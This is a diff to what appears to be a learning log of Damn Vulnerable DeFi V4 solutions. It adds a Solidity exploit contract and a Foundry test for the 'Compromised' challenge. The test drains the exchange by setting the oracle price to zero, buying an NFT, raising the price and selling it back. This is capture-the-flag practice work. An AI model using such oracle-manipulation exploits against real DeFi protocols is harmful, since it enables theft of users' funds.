@@ -749,3 +749,68 @@ function test_selfie() public checkSolvedByPlayer {
     attacker.executeAction();
 }
 ```
+<br/><br/>
+
+### Day8 - Damn Vulnerable DeFi V4 - #7 Compromised
+
+Exploit.sol
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.25;
+import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
+import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
+import {Exchange} from "../../src/compromised/Exchange.sol";
+import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+contract Exploit is IERC721Receiver{
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint nftId;
+    address recovery;
+    constructor(    
+        TrustfulOracle _oracle,
+        Exchange _exchange,
+        DamnValuableNFT _nft,
+        address _recovery
+    ) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+    function buy() external payable{
+        uint _nftId = exchange.buyOne{value:1}();
+        nftId = _nftId;
+    }
+    function sell() external payable{
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+    function recover(uint amount) external {
+        payable(recovery).transfer(amount);
+    }
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        return this.onERC721Received.selector;
+    }
+    receive() external payable{
+    }
+}
+
+```
+Compromised.t.sol
+```solidity
+    function test_compromised() public checkSolved {
+        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+        setPrice(0);
+        exploit.buy();
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+```
